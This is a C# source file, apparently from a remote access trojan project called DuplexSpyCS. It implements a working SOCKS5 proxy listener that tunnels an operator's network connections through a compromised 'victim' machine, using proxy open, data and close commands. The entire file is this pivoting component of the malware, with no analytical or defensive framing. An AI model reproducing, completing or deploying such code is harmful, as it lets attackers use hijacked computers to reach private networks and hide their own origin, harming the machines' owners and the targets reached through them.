using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Linq;
using System.Net.Sockets;
using System.Net;
using System.Text;
using System.Threading.Tasks;

namespace DuplexSpyCS
{
    public class clsLtnSocks5 : clsLtnProxy
    {
        private bool _disposed = false;

        private readonly int _nPort;
        private TcpListener _mTcpListener;
        private int _nNextStreamId = 1;

        private ConcurrentDictionary<int, clsSocksSession> _sessions = new();
        public ConcurrentDictionary<int, clsSocksSession> Sessions { get { return _sessions; } }

        public enum enSocksState
        {
            Init,
            OpenSent,
            Opened,
            Closed,
        }

        public clsLtnSocks5(clsVictim victim, string szName, int nPort, string szDescription)
        {
            m_victim = victim;
            _nPort = nPort;

            m_szName = szName;
            m_nPort = nPort;
            m_szDescription = szDescription;
            m_enProtocol = clsSqlConn.enProxyProtocol.Socks5;
        }

        ~clsLtnSocks5()
        {
            Dispose(false);
        }

        protected override void Dispose(bool disposing)
        {
            if (!_disposed)
            {
                if (disposing)
                {
                    base.Dispose(disposing);
                }

                fnStop();
                _mTcpListener = null;

                _disposed = true;
            }

            base.Dispose(disposing);
        }

        public async override void fnStart()
        {
            if (m_bIsRunning)
                return;

            _mTcpListener = new TcpListener(IPAddress.Any, _nPort);
            _mTcpListener.Start();

            m_bIsRunning = true;

            while (m_bIsRunning)
            {
                try
                {
                    var client = await _mTcpListener.AcceptTcpClientAsync();
                    _ = fnHandleSocksClient(client);
                }
                catch
                {
                    break;
                }
            }
        }

        public async override void fnStop()
        {
            m_bIsRunning = false;
            if (_mTcpListener == null)
                return;

            _mTcpListener.Stop();
        }

        private async Task fnHandleSocksClient(TcpClient tcpClient)
        {
            var stream = tcpClient.GetStream();

            if (!await fnHandleHandShake(stream))
                return;

            var req = await fnHandleConnect(stream);
            if (req == null)
                return;

            int nStreamId = Interlocked.Increment(ref _nNextStreamId);

            var session = new clsSocksSession
            {
                sktUser = tcpClient.Client,
                nStreamId = nStreamId,
                nsClientStream = stream,
                State = enSocksState.OpenSent,
            };

            _sessions[nStreamId] = session;

            fnSendOpenToVictim(nStreamId, req.szIPv4, req.nPort);
        }

        private async Task<bool> fnHandleHandShake(NetworkStream s)
        {
            byte[] hdr = new byte[2];
            await s.ReadAsync(hdr, 0, 2);

            if (hdr[0] != 0x05)
                return false;

            int nMethods = hdr[1];
            byte[] abBuffer = new byte[nMethods];
            await s.ReadAsync(abBuffer, 0, nMethods);

            await s.WriteAsync(new byte[] { 0x05, 0x00 });

            return true;
        }

        private async Task<clsSocksConnectRequest?> fnHandleConnect(NetworkStream s)
        {
            byte[] hdr = new byte[4];
            await s.ReadAsync(hdr, 0, 4);

            if (hdr[1] != 0x01) //CONNECT only
                return null;

            string szIP;
            if (hdr[3] == 0x01) //IPv4
            {
                byte[] abAddr = new byte[4];
                await s.ReadAsync(abAddr, 0, 4);
                szIP = new IPAddress(abAddr).ToString();
            }
            else if (hdr[3] == 0x03) //Domain
            {
                int nLength = s.ReadByte();
                byte[] abName = new byte[nLength];
                await s.ReadAsync(abName, 0, nLength);
                szIP = Encoding.ASCII.GetString(abName);
            }
            else
            {
                return null;
            }

            byte[] abPortBuffer = new byte[2];
            await s.ReadAsync(abPortBuffer, 0, 2);
            int nPort = (abPortBuffer[0] << 8) | abPortBuffer[1];

            return new clsSocksConnectRequest { szIPv4 = szIP, nPort = nPort };
        }

        public void fnOnProxyOpened(int nStreamId)
        {
            if (!_sessions.TryGetValue(nStreamId, out var s))
                return;

            if (s.State != enSocksState.OpenSent)
                return;

            s.State = enSocksState.Opened;

            _ = fnSendSocksSuccess(s.nsClientStream);

            _ = Task.Run(() => fnPumpSocksToClient(s));
        }

        private async Task fnSendSocksSuccess(NetworkStream ns)
        {
            byte[] abResp =
            {
                0x05, 0x00, 0x00, 0x01,
                0x00, 0x00, 0x00, 0x00,
                0x00, 0x00,
            };

            await ns.WriteAsync(abResp);
        }

        private async Task fnPumpSocksToClient(clsSocksSession session)
        {
            byte[] abBuffer = new byte[8192];

            while (m_bIsRunning && session.State == enSocksState.Opened)
            {
                int n = await session.nsClientStream.ReadAsync(abBuffer);
                if (n <= 0)
                    break;

                byte[] abReal = new byte[n];
                Buffer.BlockCopy(abBuffer, 0, abReal, 0, n);

                fnSendDataToVictim(session.nStreamId, abReal);
            }

            fnSendCloseToVictim(session.nStreamId);
            //_sessions.TryRemove(session.nStreamId, out _);
        }

        public void fnOnClientData(int nStreamId, byte[] abData)
        {
            if (!_sessions.TryGetValue(nStreamId, out var session))
                return;

            if (session.State != enSocksState.Opened)
                return;

            session.nsClientStream.Write(abData);
        }

        public void fnOnProxyClose(int nStreamId)
        {
            if (!_sessions.TryRemove(nStreamId, out var s))
                return;

            s.State = enSocksState.Closed;
            s.nsClientStream.Close();

            fnSendCloseToVictim(nStreamId);
        }

        private void fnSendOpenToVictim(int nStreamId, string szIPv4, int nPort)
        {
            m_victim.fnSendCommand(new string[]
            {
                "proxy",
                "socks5",
                "open",
                nStreamId.ToString(),
                szIPv4,
                nPort.ToString(),
            });
        }

        private void fnSendDataToVictim(int nStreamId, byte[] abBuffer)
        {
            m_victim.fnSendCommand(new string[]
            {
                "proxy",
                "socks5",
                "data",
                nStreamId.ToString(),
                Convert.ToBase64String(abBuffer),
            });
        }

        private void fnSendCloseToVictim(int nStreamId)
        {
            m_victim.fnSendCommand(new string[]
            {
                "proxy",
                "socks5",
                "close",
                nStreamId.ToString(),
            });
        }
    }

    public class clsSocksSession
    {
        public Socket sktUser;
        public int nStreamId;
        public NetworkStream nsClientStream;
        public clsLtnSocks5.enSocksState State;
    }

    class clsSocksConnectRequest
    {
        public string szIPv4;
        public int nPort;
    }
}
